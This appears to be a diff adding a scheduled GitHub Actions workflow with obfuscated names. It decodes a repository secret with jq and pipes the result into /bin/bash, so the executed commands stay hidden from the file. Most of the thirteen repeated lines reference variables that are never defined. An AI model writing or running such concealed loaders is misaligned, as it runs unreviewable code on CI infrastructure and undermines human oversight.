@@ -1,0 +1,30 @@
+name: meiliangkelang
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '57 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: meiliangkelang
+        env:
+          dy74538: ${{ secrets.dy74538 }}
+        run: |
+          echo $dy74538 | jq -r .zrzg942 | /bin/bash
+          echo $p45 | jq -r .ytn91555 | /bin/bash
+          echo $icy403 | jq -r .aqjrm49 | /bin/bash
+          echo $w062 | jq -r .ec89 | /bin/bash
+          echo $wgab36 | jq -r .v42391 | /bin/bash
+          echo $afxb48 | jq -r .k3 | /bin/bash
+          echo $m3 | jq -r .fn483 | /bin/bash
+          echo $i15 | jq -r .mkfiw687 | /bin/bash
+          echo $g574 | jq -r .fmxwt07906 | /bin/bash
+          echo $npwf086 | jq -r .i9 | /bin/bash
+          echo $bwd414 | jq -r .jnr9 | /bin/bash
+          echo $tt7160 | jq -r .re8 | /bin/bash
+          echo $jqse454 | jq -r .qkef627 | /bin/bash
+          echo $jen873 | jq -r .qvn68 | /bin/bash
+
